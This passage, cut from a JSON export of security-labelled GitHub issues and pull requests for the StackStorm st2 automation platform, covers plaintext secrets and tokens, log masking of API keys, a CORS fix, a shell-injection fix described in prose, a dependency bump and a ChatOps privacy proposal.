                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-06-15T17:32:40Z",
                        "url": "https://github.com/StackStorm/st2/issues/5145#issuecomment-861695158"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5112",
                "title": "Can token in token_d_b  stormed in ciphertext ?",
                "labels": [
                    "enhancement",
                    "question",
                    "status:need more info",
                    "security",
                    "database"
                ],
                "user": "xieyunyun",
                "issue_author_association": "NONE",
                "number": 5112,
                "id": 777767545,
                "state": "open",
                "project_created_at": "2021-01-04T02:02:02Z",
                "closed_at": null,
                "body": "In token_d_b of stackstorm, token is stored in plaintext. Could we provide some method to store the token as ciphertext ?",
                "comments": [
                    {
                        "body": "Thanks for contributing to this issue. As it has been 90 days since the last activity, we are automatically marking is as stale. If this issue is not relevant or applicable anymore (problem has been fixed in a new version or similar), please close the issue or let us know so we can close it. On the contrary, if the issue is still relevant, there is nothing you need to do, but if you have any additional details or context which would help us when working on this issue, please include it as a comment to this issue.\n",
                        "user": "stale[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-06-02T17:59:16Z",
                        "url": "https://github.com/StackStorm/st2/issues/5112#issuecomment-853264248"
                    },
                    {
                        "body": "What's the use case for this?\r\n\r\nAnd I think we would be happy to accept a PR implementing this change, but that will also require a migration script for users to run.",
                        "user": "blag",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-06-02T20:00:01Z",
                        "url": "https://github.com/StackStorm/st2/issues/5112#issuecomment-853344409"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/4983",
                "title": "Remove authentication headers from webhook payloads",
                "labels": [
                    "bug",
                    "security",
                    "size/M"
                ],
                "user": "potato",
                "issue_author_association": "CONTRIBUTOR",
                "number": 4983,
                "id": 649746055,
                "state": "closed",
                "project_created_at": "2020-07-02T08:36:22Z",
                "closed_at": "2020-09-29T20:15:11Z",
                "body": "Authentication headers (along with authentication cookies) shouldn't be stored in the payload of the trigger instance, since authentication data from `GET` query parameters are not stored either.\r\n\r\nNot filtering in `_log_request` since on `DEBUG` loglevel those can be useful data.",
                "comments": [
                    {
                        "body": "[![CLA assistant check](https://cla-assistant.io/pull/badge/signed)](https://cla-assistant.io/StackStorm/st2?pullRequest=4983) <br/>All committers have signed the CLA.",
                        "user": "CLAassistant",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-07-02T08:36:29Z",
                        "url": "https://github.com/StackStorm/st2/pull/4983#issuecomment-652870835"
                    },
                    {
                        "body": "updated the `CHANGELOG.rst`",
                        "user": "potato",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2020-07-02T12:36:15Z",
                        "url": "https://github.com/StackStorm/st2/pull/4983#issuecomment-652979835"
                    },
                    {
                        "body": "Thanks @potato @knagy for the contribution and @nmaludy for review! :+1: \r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-09-29T20:15:01Z",
                        "url": "https://github.com/StackStorm/st2/pull/4983#issuecomment-700961174"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/4983",
                    "merged_at": "2020-09-29T20:15:11Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/4884",
                "title": "Bump psutil from 5.6.3 to 5.6.6",
                "labels": [
                    "bug",
                    "enhancement",
                    "security",
                    "external dependency",
                    "size/XS"
                ],
                "user": "dependabot[bot]",
                "issue_author_association": "CONTRIBUTOR",
                "number": 4884,
                "id": 580091795,
                "state": "closed",
                "project_created_at": "2020-03-12T17:19:26Z",
                "closed_at": "2020-04-01T18:42:27Z",
                "body": "Bumps [psutil](https://github.com/giampaolo/psutil) from 5.6.3 to 5.6.6.\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from <a href=\"https://github.com/giampaolo/psutil/blob/master/HISTORY.rst\">psutil's changelog</a>.</em></p>\n<blockquote>\n<h1>5.6.6</h1>\n<p>2019-11-25</p>\n<p><strong>Bug fixes</strong></p>\n<ul>\n<li>1179_: [Linux] Process cmdline() now takes into account misbehaving processes\nrenaming the command line and using inappropriate chars to separate args.</li>\n<li>1616_: use of Py_DECREF instead of Py_CLEAR will result in double free and\nsegfault\n(<code>CVE-2019-18874 &lt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18874&gt;</code>__).\n(patch by Riccardo Schirone)</li>\n<li>1619_: [OpenBSD] compilation fails due to C syntax error.  (patch by Nathan\nHoughton)</li>\n</ul>\n<h1>5.6.5</h1>\n<p>2019-11-06</p>\n<p><strong>Bug fixes</strong></p>\n<ul>\n<li>1615_: remove pyproject.toml as it was causing installation issues.</li>\n</ul>\n<h1>5.6.4</h1>\n<p>2019-11-04</p>\n<p><strong>Enhancements</strong></p>\n<ul>\n<li>1527_: [Linux] added Process.cpu_times().iowait counter, which is the time\nspent waiting for blocking I/O to complete.</li>\n<li>1565_: add PEP 517/8 build backend and requirements specification for better\npip integration.  (patch by Bernát Gábor)</li>\n</ul>\n<p><strong>Bug fixes</strong></p>\n<ul>\n<li>875_: [Windows] Process' cmdline(), environ() or cwd() may occasionally fail\nwith ERROR_PARTIAL_COPY which now gets translated to AccessDenied.</li>\n<li>1126_: [Linux] cpu_affinity() segfaults on CentOS 5 / manylinux.\ncpu_affinity() support for CentOS 5 was removed.</li>\n<li>1528_: [AIX] compilation error on AIX 7.2 due to 32 vs 64 bit differences.\n(patch by Arnon Yaari)</li>\n<li>1535_: 'type' and 'family' fields returned by net_connections() are not\nalways turned into enums.</li>\n<li>1536_: [NetBSD] process cmdline() erroneously raise ZombieProcess error if\ncmdline has non encodable chars.</li>\n<li>1546_: usage percent may be rounded to 0 on Python 2.</li>\n</ul>\n</tr></table> ... (truncated)\n</blockquote>\n</details>\n<details>\n<summary>Commits</summary>\n<ul>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/c6cd256da95ffe9599792759b1c2586ba24fa047\"><code>c6cd256</code></a> pre release</li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/b2414b83d3d728ec34ea0e35bfb21517ee231401\"><code>b2414b8</code></a> revert <a href=\"https://github-redirect.dependabot.com/giampaolo/psutil/issues/1595\">#1595</a></li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/c63369e999b458ecbd559bdde895c344b4db2841\"><code>c63369e</code></a> updat HISTORY</li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/edb20f664f28653dcdd24f0bf0191984738dca6e\"><code>edb20f6</code></a> linux, cmdline(), fix for <a href=\"https://github-redirect.dependabot.com/giampaolo/psutil/issues/1179\">#1179</a>, comment 552984549: sometimes string ends wit...</li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/d739cbb1a5b207212d467b219dfc25b017911530\"><code>d739cbb</code></a> use PROCESS_QUERY_LIMITED_INFORMATION</li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/f7e898b0987f97352c7551bdd9b29b594e1236f6\"><code>f7e898b</code></a> <a href=\"https://github-redirect.dependabot.com/giampaolo/psutil/issues/1595\">#1595</a>: use psutil_pid_is_running() instead of GetExitCodeProcess</li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/72c84cb4edb5c0968a83c1f45ad5cc51235e0af3\"><code>72c84cb</code></a> #fix <a href=\"https://github-redirect.dependabot.com/giampaolo/psutil/issues/1595\">#1595</a> / windows: kill() may not raise AccessDenied</li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/1f8d432db12a907544ac533b66a5a61ba25321fb\"><code>1f8d432</code></a> Merge branch 'master' of github.com:giampaolo/psutil</li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/e6faebcd7adaa327d1ce57385cbebe7724d02350\"><code>e6faebc</code></a> release gil around users()/BSD (<a href=\"https://github-redirect.dependabot.com/giampaolo/psutil/issues/1425\">#1425</a>)</li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/5cb1b0b526765720253fdb2e8eff0bf380bbe0a8\"><code>5cb1b0b</code></a> Merge branch 'master' of github.com:giampaolo/psutil</li>\n<li>Additional commits viewable in <a href=\"https://github.com/giampaolo/psutil/compare/release-5.6.3...release-5.6.6\">compare view</a></li>\n</ul>\n</details>\n<br />\n\n\n[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=psutil&package-manager=pip&previous-version=5.6.3&new-version=5.6.6)](https://help.github.com/articles/configuring-automated-security-fixes)\n\nDependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.\n\n[//]: # (dependabot-automerge-start)\n[//]: # (dependabot-automerge-end)\n\n---\n\n<details>\n<summary>Dependabot commands and options</summary>\n<br />\n\nYou can trigger Dependabot actions by commenting on this PR:\n- `@dependabot rebase` will rebase this PR\n- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it\n- `@dependabot merge` will merge this PR after your CI passes on it\n- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it\n- `@dependabot cancel merge` will cancel a previously requested merge and block automerging\n- `@dependabot reopen` will reopen this PR if it is closed\n- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually\n- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language\n- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language\n- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language\n- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language\n\nYou can disable automated security fix PRs for this repo from the [Security Alerts page](https://github.com/StackStorm/st2/network/alerts).\n\n</details>",
                "comments": [
                    {
                        "body": "[![CLA assistant check](https://cla-assistant.io/pull/badge/not_signed)](https://cla-assistant.io/StackStorm/st2?pullRequest=4884) <br/>Thank you for your submission! We really appreciate it. Like many open source projects, we ask that you sign our [Contributor License Agreement](https://cla-assistant.io/StackStorm/st2?pullRequest=4884) before we can accept your contribution.<br/><sub>You have signed the CLA already but the status is still pending? Let us [recheck](https://cla-assistant.io/check/StackStorm/st2?pullRequest=4884) it.</sub>",
                        "user": "CLAassistant",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-03-12T17:19:43Z",
                        "url": "https://github.com/StackStorm/st2/pull/4884#issuecomment-598311089"
                    },
                    {
                        "body": "^^ It's amusing to see how bots talk to each other.\r\n\r\n\r\n----\r\n@m4dcoder @Kami I'll leave it for you, - please check if the security-related version bump for pip dependency looks good to merge.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-03-12T19:31:24Z",
                        "url": "https://github.com/StackStorm/st2/pull/4884#issuecomment-598375642"
                    },
                    {
                        "body": "That is a good one :p\n\n> On Mar 12, 2020, at 3:31 PM, Eugen C. <notifications@github.com> wrote:\n> \n> ﻿\n> It's amusing to see how bots talk to each other.\n> \n> —\n> You are receiving this because you are subscribed to this thread.\n> Reply to this email directly, view it on GitHub, or unsubscribe.\n",
                        "user": "punkrokk",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-03-12T19:56:54Z",
                        "url": "https://github.com/StackStorm/st2/pull/4884#issuecomment-598385296"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/4884",
                    "merged_at": "2020-04-01T18:42:26Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/4802",
                "title": "WebUI shows secrets in plain text on Rules/Enforcements section",
                "labels": [
                    "bug",
                    "security",
                    "component:st2web"
                ],
                "user": "nicholasamorim",
                "issue_author_association": "CONTRIBUTOR",
                "number": 4802,
                "id": 508415865,
                "state": "open",
                "project_created_at": "2019-10-17T11:37:19Z",
                "closed_at": null,
                "body": "## SUMMARY\r\n\r\nWeb UI shows variables marked as `secret: true` in plain text on Rules/Enforcements.\r\n\r\n`st2` CLI correctly masks it.\r\n\r\n### STACKSTORM VERSION\r\n\r\nst2 3.1.0 running on Python 2.7\r\n\r\n##### OS, environment, install method\r\n\r\nDocker\r\n\r\n## Steps to reproduce the problem\r\n\r\n```\r\n---\r\nname: full_backup\r\npack: mongodb\r\nenabled: true\r\ndescription: Performs a backup of MongoDB\r\nrunner_type: orquesta\r\nentry_point: workflows/full_backup.yaml\r\nparameters:\r\n  mongodb_password:\r\n    default: \"{{ st2kv.system.mongodb_admin_password | decrypt_kv }}\"\r\n    type: string\r\n    secret: true\r\n```\r\n\r\n```\r\nversion: 1.0\r\ndescription: A workflow that backs up Mongo\r\ninput:\r\n  - mongodb_password\r\nvars:\r\n  - stdout: null\r\n  - stderr: null\r\n\r\ntasks:\r\n  run_backup_playbook:\r\n    action: core.noop\r\noutput:\r\n  - stdout: <% ctx(stdout) %>\r\n```\r\n\r\n## Expected Results\r\n\r\nFor the Web UI to mask the password. But it shows on Web UI shows the password in Rules/Enforcements tab.\r\n\r\nUsing the `st2` CLI `execution get` _correctly masks_ the secrets.\r\n\r\n## Actual Results\r\n\r\nWeb UI shows the password in Rules/Enforcements tab. Open an execution and the password is shown in `ACTION INPUT`.\r\n",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/4800",
                "title": "password parameters, although marked as secret, are being stored in mongo as clear text",
                "labels": [
                    "enhancement",
                    "proposal",
                    "security"
                ],
                "user": "cballinc",
                "issue_author_association": "NONE",
                "number": 4800,
                "id": 503755786,
                "state": "open",
                "project_created_at": "2019-10-08T00:16:34Z",
                "closed_at": null,
                "body": "password being stored in clear text in mongo\r\ncollections:\r\n  `action_execution_d_b`\r\n   `live_action`\r\n\r\n![image](https://user-images.githubusercontent.com/5607664/66358035-157c2f80-e926-11e9-9417-0d07d3c4649a.png)\r\n",
                "comments": [
                    {
                        "body": "Thanks for the report!\r\n\r\nThe `secret` property of action parameter is there for \"masking\" secrets in API, logs, UI, CLI for someone who consume the product like operators/users.\r\nSee https://docs.stackstorm.com/reference/secrets_masking.html for more info.\r\n\r\nWe'll be happy to accept PRs to improve this and also decrypt/encrypt this intermidiate data while storing in DB, considering it doesn't break functionality like execution re-run and passing data through workflows.\r\n\r\nStackStorm user passwords, API keys/tokens, secured K/V objects are stored as encrypted in database.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2019-10-08T11:22:34Z",
                        "url": "https://github.com/StackStorm/st2/issues/4800#issuecomment-539468427"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/4784",
                "title": "Secret action field show as plaint text in rule view",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "igorfernandes",
                "issue_author_association": "NONE",
                "number": 4784,
                "id": 487631185,
                "state": "closed",
                "project_created_at": "2019-08-30T19:08:59Z",
                "closed_at": "2020-04-16T20:41:04Z",
                "body": "## SUMMARY\r\n\r\nSecret fields are showing as plain text when we see rule information.\r\n\r\n### STACKSTORM VERSION\r\n\r\nst2 3.1.0, on Python 2.7.5\r\n\r\n##### OS, environment, install method\r\n\r\nOS: Oracle Linux 7.5\r\nCustom HA installation with ST2 RPM without changes. All services separate as a single VM.\r\nst2.conf with mask_secrets = True \r\n\r\n## Steps to reproduce the problem\r\n\r\nCreate a RULE with HTTP ACTION and set the password field with anything. When click to see RULE details you can see the password as plain text.\r\n\r\n## Expected Results\r\n\r\nAs a secret parameter of action, that does not need to show in rule information\r\n\r\n## Actual Results\r\n\r\nWe can see all secret field as plain text\r\n\r\n![Screen Shot 2019-08-30 at 3 46 24 PM](https://user-images.githubusercontent.com/3451406/64045630-2627d180-cb40-11e9-88a0-b6b5131c8a77.png)\r\n",
                "comments": [
                    {
                        "body": "Closed by #4807",
                        "user": "igorfernandes",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-04-16T20:41:04Z",
                        "url": "https://github.com/StackStorm/st2/issues/4784#issuecomment-614883556"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/4675",
                "title": "Fix a possible shell command injection in the linux.service action",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "Kami",
                "issue_author_association": "MEMBER",
                "number": 4675,
                "id": 443405243,
                "state": "closed",
                "project_created_at": "2019-05-13T13:41:18Z",
                "closed_at": "2019-05-14T17:10:04Z",
                "body": "This pull request fixes a possible shell command injection in ``linux.service`` action.\r\n\r\n## Background,  Context\r\n\r\nThe code didn't escape ``service`` and ``action`` parameter passed to ``subprocess.Popen`` and used ``shell=True``.\r\n\r\nThis pull request fixes the action to use ``shell=False`` and passes command to ``subprocess.Popen`` as a list of arguments instead of as a string (in this scenario, values are automatically escaped by ``subprocess.Popen``).\r\n\r\nThis issue was reported to us by James Robinson (Netskope and Veracode).",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/4675",
                    "merged_at": "2019-05-14T17:10:04Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/4631",
                "title": "Feature Request: Honor `secret: true` in output schema in CLI & UI",
                "labels": [
                    "feature",
                    "security"
                ],
                "user": "LindsayHill",
                "issue_author_association": "CONTRIBUTOR",
                "number": 4631,
                "id": 431773813,
                "state": "closed",
                "project_created_at": "2019-04-11T00:08:59Z",
                "closed_at": "2021-09-11T22:55:36Z",
                "body": "##### SUMMARY\r\n\r\nAction responses marked as `secret` should be masked in CLI & UI, similar to action input parameters masked as secret.\r\n\r\n##### ISSUE TYPE\r\n - Feature Idea\r\n\r\n##### STACKSTORM VERSION\r\n\r\n`st2 3.0dev (44c4953), on Python 2.7.12`\r\n\r\n##### DETAILS\r\n\r\nWe support [Secrets Masking](https://docs.stackstorm.com/reference/secrets_masking.html), and we now support [Action Output Schema](https://docs.stackstorm.com/latest/actions.html#output-schema). \r\n\r\n[action_output_schema.json](https://github.com/StackStorm/st2/blob/master/st2common/st2common/util/schema/action_output_schema.json#L96) has a flag for `secret`. \r\n\r\nBut today that flag doesn't do anything. If our action metadata contains this:\r\n\r\n```yaml\r\noutput_schema:\r\n  version:\r\n    type: string\r\n    required: true\r\n    secret: true\r\n  executable:\r\n    type: string\r\n    required: true\r\n```\r\n\r\nThen running the action produces this output:\r\n```sh\r\nvagrant@ubuntu-xenial:~$ st2 execution get 5ca6dbd90761290dc50f165b\r\nid: 5ca6dbd90761290dc50f165b\r\nstatus: succeeded (1s elapsed)\r\nparameters: None\r\nresult:\r\n  exit_code: 0\r\n  result:\r\n    executable: /opt/stackstorm/virtualenvs/examples/bin/python\r\n    version: 2.7.12\r\n  stderr: ''\r\n  stdout: 'Using Python executable: 2.7.12\r\n    Using Python version: /opt/stackstorm/virtualenvs/examples/bin/python\r\n    '\r\nvagrant@ubuntu-xenial:~$\r\n```\r\n\r\nSimilarly, in the Web UI, `version` is not masked. \r\n\r\nWe should mask this by default in the CLI & Web UI, with `show-secrets`, as a flag available to admin users (similar to the way it works today with input secrets).\r\n\r\nThis also applies to workflows, the main use case for hiding secrets - e.g. task1 retrieves a secret, which then passes it to task2. That should be masked by default.",
                "comments": [
                    {
                        "body": "Thanks for opening this issue (I also wanted to do it, but you beat me to it :)).",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2019-04-12T07:11:07Z",
                        "url": "https://github.com/StackStorm/st2/issues/4631#issuecomment-482464397"
                    },
                    {
                        "body": "I just verified that this is no longer an issue with st2 v3.5.0. \r\n\r\nThe cli output of a midified examples.python_runner_print_python_version execution with `version` being defined as secret in the output_schema: \r\n```\r\nroot@st2-launchdev-u20:/opt/stackstorm/packs/examples/actions# st2 run examples.python_runner_print_python_version\r\n.\r\nid: 613d335206bb9e4cf97a8b05\r\naction.ref: examples.python_runner_print_python_version\r\ncontext.user: st2admin\r\nparameters: None\r\nstatus: succeeded\r\nstart_timestamp: Sat, 11 Sep 2021 22:53:06 UTC\r\nend_timestamp: Sat, 11 Sep 2021 22:53:06 UTC\r\nresult: \r\n  exit_code: 0\r\n  result:\r\n    version: '********'\r\n  stderr: ''\r\n  stdout:\r\n```\r\n\r\nAnd the corresponding UI output: \r\n![Selection_287](https://user-images.githubusercontent.com/1457899/132963501-e65c01b5-6765-4b74-90ef-c8d6fc9e4ab3.png)\r\n",
                        "user": "winem",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-09-11T22:55:36Z",
                        "url": "https://github.com/StackStorm/st2/issues/4631#issuecomment-917497841"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/4592",
                "title": "Make sure we don't log sensitive query params in the st2api log file",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "Kami",
                "issue_author_association": "MEMBER",
                "number": 4592,
                "id": 420394586,
                "state": "closed",
                "project_created_at": "2019-03-13T09:25:11Z",
                "closed_at": "2019-03-13T14:53:29Z",
                "body": "Our logging middleware didn't mask / remove auth token and api key values if those were provided via query parameters and not headers.\r\n\r\nThis pull request fixes that.\r\n\r\nKeep in mind that providing it as header is still preferred, especially when integrating with 3rd party services, because a lot of services log actual full URL with a query string which could mean leaking those values there. I will add a note about that to the docs.\r\n\r\nResolves #4589.\r\n\r\nAlso, as commented on #4589, I believe that issue actually talks about token being logged in a loadbalancer log or similar because the log line doesn't look anything like st2api log line. In that scenario we can't do anything about that and that's why I mentioned above, using headers is preferred (and I will also document that).\r\n\r\n## TODO\r\n\r\n- [x] Tests\r\n- [x] Documentation change",
                "comments": [
                    {
                        "body": "I forgot I already added a note about that to the docs in the past so I only made a small formatting change - https://github.com/StackStorm/st2docs/pull/866.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2019-03-13T09:34:23Z",
                        "url": "https://github.com/StackStorm/st2/pull/4592#issuecomment-472346856"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/4592",
                    "merged_at": "2019-03-13T14:53:29Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/4589",
                "title": "The api key in the st2api log is not obfuscated",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "jinpingh",
                "issue_author_association": "CONTRIBUTOR",
                "number": 4589,
                "id": 420124704,
                "state": "closed",
                "project_created_at": "2019-03-12T17:50:34Z",
                "closed_at": "2019-03-13T14:53:29Z",
                "body": "##### SUMMARY\r\nThe user found in clean API key in query request (for the load balancer health check)\r\n```GET /api/v1/?st2-api-key=foo HTTP/1.1```\r\n\r\n##### ISSUE TYPE\r\n - Bug Report\r\n \r\n##### STACKSTORM VERSION\r\nst2 2.10.3, on Python 2.7.12",
                "comments": [
                    {
                        "body": "Can they just set the API key as a header value instead of in the URL? https://docs.stackstorm.com/authentication.html#api-key-usage",
                        "user": "nmaludy",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2019-03-12T17:52:54Z",
                        "url": "https://github.com/StackStorm/st2/issues/4589#issuecomment-472111603"
                    },
                    {
                        "body": "@nmaludy Probably, but we should obfuscate it on all our valid methods of providing the key.",
                        "user": "bigmstone",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2019-03-12T19:47:25Z",
                        "url": "https://github.com/StackStorm/st2/issues/4589#issuecomment-472153999"
                    },
                    {
                        "body": "Yeah, providing API key as a query param is meant as a last resort for integration with services which don't support sending custom headers, because it's not safe (a lot of external services will log full URL with query params).\r\n\r\nHaving said that, @bigmstone is correct. We should still not log in in st2api log file.\r\n\r\n@jinpingh Thanks for reporting this and good catch.\r\n\r\nThe log line you provided doesn't look like st2api log line. Is that from load balancer log file? If that's the case, there is nothing we can do about load balancer logging that query param, we can just filter it on the API side.\r\n\r\nHere is an example of how st2api log line looks like:\r\n\r\n```bash\r\n2019-03-13 09:09:27,601 INFO [-] 9d6e473e-d7da-4e07-bbec-d81af1b4bf95 - GET /v1 with query={'st2-api-key': ['bar']} (method='GET',path='/v1',remote_addr='127.0.0.1',query={'st2-api-key': ['bar']},request_id='9d6e473e-d7da-4e07-bbec-d81af1b4bf95')\r\n2019-03-13 09:09:27,603 INFO [-] 9d6e473e-d7da-4e07-bbec-d81af1b4bf95 - 200 80 1.469ms (method='GET',path='/v1',remote_addr='127.0.0.1',status=200,runtime=1.469,content_length=80,request_id='9d6e473e-d7da-4e07-bbec-d81af1b4bf95')\r\n```",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2019-03-13T09:10:43Z",
                        "url": "https://github.com/StackStorm/st2/issues/4589#issuecomment-472338781"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/4577",
                "title": "Fix improper CORS return",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "bigmstone",
                "issue_author_association": "CONTRIBUTOR",
                "number": 4577,
                "id": 417441932,
                "state": "closed",
                "project_created_at": "2019-03-05T18:27:22Z",
                "closed_at": "2019-03-05T19:01:37Z",
                "body": "Prior to this commit if you sent a request from an origin not listed in `allowed_origins` we would respond with `null` for the `Access-Control-Allow-Origin` header. Per [mozilla's documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin#Directives) `null` should not be used as some clients will allow the request to go through. This PR returns the first of our allowed origins if the requesting origin is not a supported origin.",
                "comments": [
                    {
                        "body": "LGTM, probably also a good idea to document this behavior in st2docs?",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2019-03-06T03:15:30Z",
                        "url": "https://github.com/StackStorm/st2/pull/4577#issuecomment-469951701"
                    },
                    {
                        "body": "Hey, I am the reporter of this bug, I assigned the following CVE for it:\r\nCVE-2019-9580\r\nThanks for fixing and fast cooperation :)",
                        "user": "Quitten",
                        "issue_author_association": "NONE",
                        "project_created_at": "2019-03-06T17:43:41Z",
                        "url": "https://github.com/StackStorm/st2/pull/4577#issuecomment-470204850"
                    },
                    {
                        "body": "@Quitten thanks again. The patch release should be out today. Will keep you posted.",
                        "user": "bigmstone",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2019-03-06T17:54:42Z",
                        "url": "https://github.com/StackStorm/st2/pull/4577#issuecomment-470208836"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/4577",
                    "merged_at": "2019-03-05T19:01:37Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/4559",
                "title": "Feature Request: Action-Alias private/public flag",
                "labels": [
                    "help wanted",
                    "feature",
                    "proposal",
                    "chatops",
                    "security"
                ],
                "user": "nzlosh",
                "issue_author_association": "CONTRIBUTOR",
                "number": 4559,
                "id": 412313876,
                "state": "open",
                "project_created_at": "2019-02-20T08:59:16Z",
                "closed_at": null,
                "body": "\r\n##### SUMMARY\r\n\r\nIn certain ChatOps cases it is desirable to limit action-alias triggers/results to a public or private channel for data privacy reasons.\r\n\r\n##### ISSUE TYPE\r\n - Feature Idea\r\n\r\n##### STACKSTORM VERSION\r\nN/A\r\n\r\n\r\n##### OS / ENVIRONMENT / INSTALL METHOD\r\nN/A\r\n\r\n\r\n##### STEPS TO REPRODUCE\r\nTo support this feature, the action-alias data structure could be extended to include a `privacy` flag at the `root` and `result` level.  The privacy flag accepts a string type with valid values being:\r\n\r\n**trigger privacy**\r\n - `public`: action-alias triggered only in a public channel.\r\n - `private`: action-alias triggered only in a private channel.\r\n - `any`: action-alias triggered in either public or private channel.\r\n\r\n**result privacy**\r\n - `public`: action-alias result sent to public channel only.\r\n - `private`: action-alias result sent to private channel only.\r\n - `any`: action-alias result sent to either public or private channel.\r\n\r\nThe flags combinations  would imply the following behaviour:\r\n\r\n| ActionAlias|Privacy flag||Response|\r\n|--|--|--|--|\r\n|**Triggered**|**Trigger**|**Result**| |\r\n|--|--|--|--|\r\n|public|private|private|reject trigger|\r\n|public|private|public|reject trigger|\r\n|public|private|any|reject trigger|\r\n|public|public|private|result to user|\r\n|public|public|public|result to channel|\r\n|public|public|any|result to channel|\r\n|public|any|private|result to user|\r\n|public|any|public|result to channel|\r\n|public|any|any|result to channel|\r\n|--|--|--|--|\r\n|private|private|private|result to user|\r\n|private|private|public|reject trigger : public channel not available with 1 to 1 communication.|\r\n|private|private|any|result to user|\r\n|private|public|private|reject trigger|\r\n|private|public|public|reject trigger|\r\n|private|public|any|reject trigger|\r\n|private|any|private|result to user|\r\n|private|any|public|reject trigger : public channel not available with 1 to 1 communication.|\r\n|private|any|any|result to user|\r\n\r\n**YAML** definition would permit the addition of these items in an action-alias definition.\r\n```\r\nprivacy: <\"public\"|\"private\"|\"any\">\r\nresult:\r\n  privacy: <\"public\"|\"private\"|\"any\">\r\n```\r\n\r\nIt is the calling codes responsibility to interpret and apply the correct meaning of `public`, `private`, `any` in the context of the backend being used.\r\n\r\n##### EXPECTED RESULTS\r\n\r\nAs an example of ChatOps using the Slack backend:\r\n\r\n```\r\n---\r\nname: \"kitten\"\r\npack: \"kitten\"\r\ndescription: \"Post a kitten picture to cheer people up.\"\r\naction_ref: \"core.noop\"\r\nprivacy: \"any\"\r\nformats:\r\n  - \"kitten pic\"\r\nack:\r\n  enabled: false\r\nresult:\r\n  privacy: \"public\"\r\n  format: \"your kittens are here! {~} Regards from the Box Kingdom.\"\r\n  extra:\r\n    slack:\r\n      image_url: \"http://i.imgur.com/Gb9kAYK.jpg\"\r\n      fields:\r\n        - title: Kitten headcount\r\n          value: Eight.\r\n          short: true\r\n        - title: Number of boxes\r\n          value: A bunch.\r\n          short: true\r\n      color: \"#00AA00\"\r\n```\r\nIn the above example the bot would enforce `!kitten pic` to be triggered in a 